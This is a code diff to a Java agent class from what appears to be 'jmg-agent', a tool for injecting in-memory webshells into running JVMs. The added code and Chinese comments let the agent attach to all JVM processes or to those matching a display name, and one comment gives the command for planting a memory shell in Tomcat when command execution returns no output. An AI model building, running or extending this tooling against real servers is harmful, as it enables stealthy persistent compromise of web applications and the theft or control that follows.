@@ -17,6 +17,7 @@ import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
 import java.security.ProtectionDomain;
+import java.util.ArrayList;
 import java.util.List;
 
 public class TomcatAgentTransformer implements ClassFileTransformer {
@@ -136,22 +137,55 @@ public class TomcatAgentTransformer implements ClassFileTransformer {
 
     }
 
+    /*
+    使用方法：
+        java -jar jmg-agent.jar                    // 列出所有的 JVM 进程 ID
+        java -jar jmg-agent.jar all                // 将 agent 注入到所有 JVM 进程
+        java -jar jmg-agent.jar [pid]              // 将 agent 注入到指定的 JVM 进程，其中 [pid] 是 JVM 进程的 ID
+        java -jar jmg-agent.jar [displayName]      // 将 agent 注入到所有 displayName 包含 [displayName] 字符串的 JVM 进程
+    */
     public static void main(String[] args) throws Exception {
-        String jvmProcessId = null;
+        // 无参数 - 列出所有 JVM 进程 ID
         if (args.length == 0) {
-            // 列出所有 pid
             listAllJvmPids();
-        } else {
-            try {
-                Integer.parseInt(args[0]);
-                jvmProcessId = args[0];
-                attachAgentToTargetJvm(jvmProcessId);
-            } catch (NumberFormatException e) {
-                throw new IllegalArgumentException("Argument must be an integer representing a JVM process ID");
+        } else if (args.length == 1) {
+            String arg = args[0];
+            // "all"，将 agent 注入到所有 JVM 进程（试验性功能，缺少实战验证，所以自行编译使用）
+            if (arg.equalsIgnoreCase("all")) {
+                for (String jvmProcessId : getAllJvmPids()) {
+                    attachAgentToTargetJvm(jvmProcessId);
+                }
             }
+            // JVM 进程 ID，将 agent 注入到指定的 JVM 进程
+            else {
+                try {
+                    Integer.parseInt(arg);
+                    attachAgentToTargetJvm(arg);
+                } catch (NumberFormatException e) {
+                    /*
+                      WHY: 解决命令执行无回显、但又不想注入到所有 JVM 进程（比参数 'all' 更优雅一点）
+                      WHAT：不是 JVM 进程 ID，将其视为 displayName，并将 agent 注入到所有 displayName 包含该字符串的 JVM 进程
+                      HOW： tomcat -> org.apache.catalina.startup.Bootstrap，可使用 java -jar jmg-agent.jar catalina 注入内存马
+                    */
+                    for (String jvmProcessId : getJvmPidsByDisplayName(arg)) {
+                        attachAgentToTargetJvm(jvmProcessId);
+                    }
+                }
+            }
+        } else {
+            throw new IllegalArgumentException("Too many arguments. Expected none, 'all', a JVM process ID, or a displayName.");
         }
     }
 
+    public static List<String> getAllJvmPids() throws Exception {
+        List<String> pids = new ArrayList<>();
+        for (Object vm : vms) {
+            Method getId = virtualMachineDescriptorClass.getDeclaredMethod("id");
+            String id = (String) getId.invoke(vm);
+            pids.add(id);
+        }
+        return pids;
+    }
 
     public static void listAllJvmPids() throws Exception {
         for (Object vm : vms) {
@@ -161,6 +195,23 @@ public class TomcatAgentTransformer implements ClassFileTransformer {
             String id = (String) getId.invoke(vm);
             infoLog(String.format("Found pid %s ——> [%s]", id, displayName));
         }
+    }
+
+    public static List<String> getJvmPidsByDisplayName(String displayName) throws Exception {
+        List<String> pids = new ArrayList<>();
+        for (Object vm : vms) {
+            Method displayNameMethod = virtualMachineDescriptorClass.getMethod("displayName");
+            String currentDisplayName = (String) displayNameMethod.invoke(vm);
+            System.out.println(currentDisplayName);
+            System.out.println(displayName);
+            System.out.println();
+            if (currentDisplayName.toLowerCase().contains(displayName.toLowerCase())) {
+                Method getId = virtualMachineDescriptorClass.getDeclaredMethod("id");
+                String id = (String) getId.invoke(vm);
+                pids.add(id);
+            }
+        }
+        return pids;
     }
 
     private static void attachAgentToTargetJvm(String targetPID) throws Exception {
